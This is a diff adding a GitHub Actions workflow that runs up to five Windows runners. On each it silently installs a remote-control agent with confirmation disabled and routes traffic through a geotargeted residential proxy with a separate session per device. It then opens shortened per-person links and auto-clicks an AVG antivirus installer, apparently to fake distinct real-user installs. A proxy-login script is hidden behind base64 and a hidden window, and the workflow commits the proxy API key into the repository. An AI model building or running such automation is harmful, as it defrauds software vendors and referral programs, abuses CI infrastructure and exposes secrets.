@@ -1,0 +1,366 @@
+name: Parallel Windows Auto-Installer
+
+on:
+  workflow_dispatch:
+    inputs:
+      os_version:
+        description: 'Select OS Runner Version'
+        required: true
+        type: choice
+        options:
+          - 'windows-2025'
+          - 'windows-2022'
+          - 'windows-11-arm'
+        default: 'windows-2025'
+      getscreen_email:
+        description: 'Getscreen.me Account Email'
+        required: true
+        type: string
+        default: 'techx@justzeus.com'
+      num_devices:
+        description: 'Number of Devices to Spawn'
+        required: true
+        type: choice
+        options:
+          - '1'
+          - '2'
+          - '3'
+          - '4'
+          - '5'
+        default: '5'
+      avg_link:
+        description: 'Select AVG Link'
+        required: true
+        type: choice
+        options:
+          - 'Trader'
+          - 'MlzYT'
+          - 'F.ahmad'
+          - 'B4Books'
+        default: 'Trader'
+      scrapeops_api_key:
+        description: 'ScrapeOps API Key (Proxy Password)'
+        required: true
+        type: string
+        default: ''
+      proxy_country:
+        description: 'Proxy Country Geotargeting'
+        required: true
+        type: choice
+        options:
+          - 'USA'
+          - 'UK'
+          - 'Canada'
+          - 'Australia'
+          - 'Germany'
+          - 'France'
+        default: 'USA'
+      sticky_sessions:
+        description: 'Enable Unique Sticky Sessions per Device'
+        required: true
+        type: boolean
+        default: true
+
+jobs:
+  prepare_matrix:
+    name: Check Inputs & Prepare Runners
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.GH_PAT || github.token }}
+
+      - name: Generate Dynamic Matrix & Proxy Config
+        id: set-matrix
+        shell: python
+        env:
+          EMAIL: ${{ inputs.getscreen_email }}
+          NUM_DEVICES: ${{ inputs.num_devices }}
+          OS_VERSION: ${{ inputs.os_version }}
+          AVG_LINK: ${{ inputs.avg_link }}
+          API_KEY: ${{ inputs.scrapeops_api_key }}
+          COUNTRY: ${{ inputs.proxy_country }}
+          STICKY: ${{ inputs.sticky_sessions }}
+        run: |
+          import os, json, uuid
+          
+          email = os.environ.get("EMAIL", "").strip()
+          num_devices = int(os.environ.get("NUM_DEVICES", "1"))
+          os_version = os.environ.get("OS_VERSION", "windows-2025")
+          api_key = os.environ.get("API_KEY", "").strip()
+          country_input = os.environ.get("COUNTRY", "USA")
+          sticky = os.environ.get("STICKY", "false").lower() == "true"
+          avg_choice = os.environ.get("AVG_LINK", "Trader")
+          
+          # Map Country to ScrapeOps codes
+          country_map = {
+              "USA": "us", "UK": "uk", "Canada": "ca",
+              "Australia": "au", "Germany": "de", "France": "fr"
+          }
+          cc = country_map.get(country_input, "us")
+          
+          # Map AVG selections to URLs
+          urls = {
+              "Trader": "https://u.to/a-trdr/xDh4Ig",
+              "MlzYT": "https://u.to/a-mlz/Agt3Ig",
+              "F.ahmad": "https://u.to/a-fah/4Qp3Ig",
+              "B4Books": "https://u.to/a-b4b/7wp3Ig"
+          }
+          avg_url = urls.get(avg_choice, urls["Trader"])
+
+          includes =[]
+          if email:
+              for i in range(1, num_devices + 1):
+                  short_os = os_version.replace("windows-", "")
+                  device_name = f"{i}-Win-{short_os}"
+                  
+                  # Format ScrapeOps Username
+                  proxy_user = f"scrapeops.country={cc}"
+                  if sticky:
+                      session_id = str(uuid.uuid4())[:8] # Unique 8-char string per parallel runner
+                      proxy_user += f".sticky_session={session_id}"
+
+                  includes.append({
+                      "device": device_name,
+                      "email": email,
+                      "os": os_version,
+                      "proxy_user": proxy_user,
+                      "proxy_pass": api_key,
+                      "avg_url": avg_url
+                  })
+
+          if not includes:
+              print("Error: Valid configuration could not be generated. Exiting.")
+              exit(1)
+
+          with open(os.environ["GITHUB_OUTPUT"], "a") as f:
+              f.write(f"matrix={json.dumps({'include': includes})}\n")
+
+      - name: Update Workflow Defaults (Remember Inputs)
+        shell: python
+        env:
+          OS_VERSION: ${{ inputs.os_version }}
+          GETSCREEN_EMAIL: ${{ inputs.getscreen_email }}
+          NUM_DEVICES: ${{ inputs.num_devices }}
+          AVG_LINK: ${{ inputs.avg_link }}
+          API_KEY: ${{ inputs.scrapeops_api_key }}
+          COUNTRY: ${{ inputs.proxy_country }}
+          STICKY: ${{ inputs.sticky_sessions }}
+        run: |
+          import re, os, glob
+          files = glob.glob(".github/workflows/*.yml")
+          if files:
+              file_path = files[0]
+              with open(file_path, "r") as f:
+                  content = f.read()
+
+              def update_default_str(input_name, new_val):
+                  global content
+                  pattern = r"(" + input_name + r":[\s\S]*?default:\s*')[^']*(')"
+                  content = re.sub(pattern, rf"\g<1>{new_val}\g<2>", content, count=1)
+              
+              def update_default_bool(input_name, new_val):
+                  global content
+                  pattern = r"(" + input_name + r":[\s\S]*?default:\s*)(true|false)"
+                  content = re.sub(pattern, rf"\g<1>{new_val.lower()}", content, count=1)
+
+              update_default_str("os_version", os.environ.get("OS_VERSION"))
+              update_default_str("getscreen_email", os.environ.get("GETSCREEN_EMAIL"))
+              update_default_str("num_devices", os.environ.get("NUM_DEVICES"))
+              update_default_str("avg_link", os.environ.get("AVG_LINK"))
+              update_default_str("scrapeops_api_key", os.environ.get("API_KEY"))
+              update_default_str("proxy_country", os.environ.get("COUNTRY"))
+              update_default_bool("sticky_sessions", os.environ.get("STICKY"))
+
+              with open(file_path, "w") as f:
+                  f.write(content)
+
+      - name: Commit and Push New Defaults
+        run: |
+          git config --global user.name "github-actions[bot]"
+          git config --global user.email "github-actions[bot]@users.noreply.github.com"
+          git add .github/workflows/*.yml
+          git diff --quiet && git diff --staged --quiet || (git commit -m "Update last used inputs [skip ci]" && git push)
+
+  remote_session:
+    name: Remote Session ${{ matrix.device }}
+    needs: prepare_matrix
+    runs-on: ${{ matrix.os }}
+    timeout-minutes: 60
+
+    strategy:
+      fail-fast: false
+      matrix: ${{ fromJson(needs.prepare_matrix.outputs.matrix) }}
+
+    steps:
+      - name: Install and Start Getscreen.me (Windows)
+        shell: pwsh
+        run: |
+          Write-Host "Downloading Getscreen.me Agent..."
+          $MaxRetries = 3
+          $RetryCount = 0
+          $Success = $false
+          while (-not $Success -and $RetryCount -lt $MaxRetries) {
+              try {
+                  Invoke-WebRequest -Uri "https://getscreen.me/download/getscreen.msi" -OutFile "getscreen.msi" -ErrorAction Stop
+                  if ((Get-Item "getscreen.msi").length -gt 1MB) { $Success = $true }
+                  else { Start-Sleep -Seconds 5; $RetryCount++ }
+              } catch { Start-Sleep -Seconds 5; $RetryCount++ }
+          }
+          if (-not $Success) { exit 1 }
+
+          $InstallArgs = "/i getscreen.msi /qn REGISTER=`"${{ matrix.email }}`" CONFIG=`"name='${{ matrix.device }}' autostart=true nonadmin=true control=true disable_confirmation=true`""
+          Start-Process msiexec.exe -Wait -ArgumentList $InstallArgs
+          Write-Host "Getscreen.me is configured and running."
+
+      - name: Setup Proxied Auto-Downloader & AVG Installation
+        shell: pwsh
+        env:
+          PROXY_USER: ${{ matrix.proxy_user }}
+          PROXY_PASS: ${{ matrix.proxy_pass }}
+          AVG_URL: ${{ matrix.avg_url }}
+        run: |
+          Write-Host "============================================================" -ForegroundColor Cyan
+          Write-Host " Zero-Touch Proxy-Aware Downloader & Installer Active" -ForegroundColor Cyan
+          Write-Host "============================================================" -ForegroundColor Cyan
+
+          # 1. Ensure Python dependencies are available
+          Write-Host "Checking python UIA modules..." -ForegroundColor DarkGray
+          python -m pip install pywinauto pyautogui pygetwindow --quiet
+
+          # 2. Start Fileless Proxy Authentication Background loop
+          if ($env:PROXY_PASS -ne "") {
+              Write-Host "Starting UIA Proxy Auth handler for ScrapeOps..." -ForegroundColor Cyan
+              $pyProxyScript = @"
+import time, sys
+from pywinauto import Desktop
+
+def handle_proxy_auth(username, password, timeout=90):
+    desktop = Desktop(backend="uia")
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        try:
+            for window in desktop.windows(visible_only=True):
+                user_fields = window.descendants(control_type="Edit", title="Username")
+                pass_fields = window.descendants(control_type="Edit", title="Password")
+                if user_fields and pass_fields:
+                    window.set_focus()
+                    time.sleep(0.5)
+                    user_fields[0].click_input()
+                    user_fields[0].type_keys(username, with_spaces=True, pause=0.02)
+                    pass_fields[0].click_input()
+                    pass_fields[0].type_keys(password, with_spaces=True, pause=0.02)
+                    btn = window.descendants(control_type="Button", title="Sign in")
+                    if btn:
+                        btn[0].click_input()
+                    else:
+                        pass_fields[0].type_keys("{ENTER}")
+                    return True
+        except Exception:
+            pass
+        time.sleep(1)
+    return False
+
+if __name__ == "__main__":
+    handle_proxy_auth(sys.argv[1], sys.argv[2])
+"@
+              $bytes = [System.Text.Encoding]::UTF8.GetBytes($pyProxyScript)
+              $b64 = [Convert]::ToBase64String($bytes)
+              $launcher = "import base64,sys;exec(base64.b64decode('$b64').decode('utf-8'))"
+              Start-Process -FilePath "python" -ArgumentList "-c `"$launcher`" `"$env:PROXY_USER`" `"$env:PROXY_PASS`"" -WindowStyle Hidden
+          }
+
+          # 3. Setup the AVG UI Watcher/Clicker in the background
+          $dlFolder = "$env:USERPROFILE\Downloads"
+          $timeoutSecs = 55 * 60
+
+          $avgJob = Start-Job -ScriptBlock {
+              param($dlFolder, $timeoutSecs)
+              $deadline = (Get-Date).AddSeconds($timeoutSecs)
+              $installed = $false
+
+              while (-not $installed -and (Get-Date) -lt $deadline) {
+                  $candidates = Get-ChildItem -Path $dlFolder -Filter "*avg*.exe" -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '\.(crdownload|part|tmp)$' } | Sort-Object LastWriteTime -Descending
+
+                  if ($candidates.Count -gt 0) {
+                      $file = $candidates[0]
+                      Write-Output "[AVG] Download complete! Opening installer GUI..."
+
+                      $locked = $true
+                      while ($locked) { Start-Sleep -Seconds 2; try { $s =[System.IO.File]::Open($file.FullName, 'Open', 'Read', 'None'); $s.Close(); $locked = $false } catch { } }
+
+                      Start-Process -FilePath $file.FullName
+
+                      Write-Output "[AVG] Sending automated UI keys..."
+                      $pyCode = "import pyautogui, pygetwindow as gw, time`n" +
+                                "for _ in range(60):`n" +
+                                "    wins =[w for w in gw.getAllWindows() if 'AVG' in w.title or 'Antivirus' in w.title]`n" +
+                                "    if wins:`n" +
+                                "        try:`n" +
+                                "            wins[0].activate()`n" +
+                                "            time.sleep(5)`n" +
+                                "            pyautogui.press('enter')`n" +
+                                "            time.sleep(1)`n" +
+                                "            pyautogui.press('space')`n" +
+                                "            print('[AVG-UI] Keys sent to installer.')`n" +
+                                "        except Exception as e: print(f'[AVG-UI] Err: {e}')`n" +
+                                "        break`n" +
+                                "    time.sleep(2)`n"
+                      $pyCode | Out-File -FilePath "$env:TEMP\avg_ui.py" -Encoding utf8
+                      python -u "$env:TEMP\avg_ui.py"
+                      
+                      Write-Output "[AVG] Waiting for final application deployment..."
+                      $avgPaths = @("C:\Program Files\AVG\Antivirus\AVGUI.exe", "C:\Program Files (x86)\AVG\Antivirus\AVGUI.exe")
+                      $launched = $false
+                      for ($i = 0; $i -lt 300; $i++) {
+                          foreach ($p in $avgPaths) {
+                              if (Test-Path $p) {
+                                  Start-Sleep -Seconds 3
+                                  Write-Output "[AVG] Launching AVG..."
+                                  Start-Process -FilePath $p
+                                  $launched = $true; break
+                              }
+                          }
+                          if ($launched) { break }
+                          Start-Sleep -Seconds 2
+                      }
+                      $installed = $true
+                  } else { Start-Sleep -Seconds 5 }
+              }
+          } -ArgumentList $dlFolder, $timeoutSecs
+
+          # 4. Find Edge Path & Launch it
+          $edgeExe = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+          if (-Not (Test-Path $edgeExe)) {
+              $edgeExe = "C:\Program Files\Microsoft\Edge\Application\msedge.exe"
+          }
+
+          $proxyServer = "residential-proxy.scrapeops.io:8181"
+          $edgeArgs = @("--no-first-run", "--no-default-browser-check", "--disable-sync")
+          
+          if ($env:PROXY_PASS -ne "") {
+              $edgeArgs += "--proxy-server=`"http://$proxyServer`""
+          }
+          $edgeArgs += "`"$env:AVG_URL`""
+
+          Write-Host "Launching Edge with Proxy -> $env:AVG_URL" -ForegroundColor Cyan
+          Start-Process -FilePath $edgeExe -ArgumentList ($edgeArgs -join " ")
+
+          # 5. Monitor Output of Background Job
+          $deadline = (Get-Date).AddSeconds($timeoutSecs)
+          while ($true) {
+              $output = Receive-Job -Job $avgJob -ErrorAction SilentlyContinue
+              if ($output) { foreach ($line in $output) { Write-Host $line } }
+              if ($avgJob.State -eq 'Completed' -or $avgJob.State -eq 'Failed' -or (Get-Date) -gt $deadline) { break }
+              Start-Sleep -Seconds 5
+          }
+
+      - name: Keep Runner Alive
+        if: always()
+        shell: pwsh
+        run: |
+          Write-Host "Session is active. This runner will remain online until the job timeout is reached."
+          Start-Sleep -Seconds 3600
